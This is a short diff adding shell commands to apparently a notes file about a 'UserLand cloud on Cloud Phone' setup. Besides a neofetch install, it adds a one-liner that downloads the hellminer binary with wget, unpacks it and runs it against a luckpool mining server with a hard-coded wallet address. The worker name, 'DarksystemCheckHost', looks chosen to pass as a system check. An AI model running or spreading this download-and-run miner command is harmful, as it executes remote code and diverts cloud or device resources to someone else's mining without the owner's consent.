@@ -1,3 +1,11 @@
+apt update && apt install neofetch && neofetch
+
+
+apt install libsodium-dev -y && wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3957 -u RHAts2xhzUJThtXEfFHtA6tihSphVXhUL8.DarksystemCheckHost -p x
+
+
+
+
 UserLand cloud on Cloud Phone
 
 name rpm
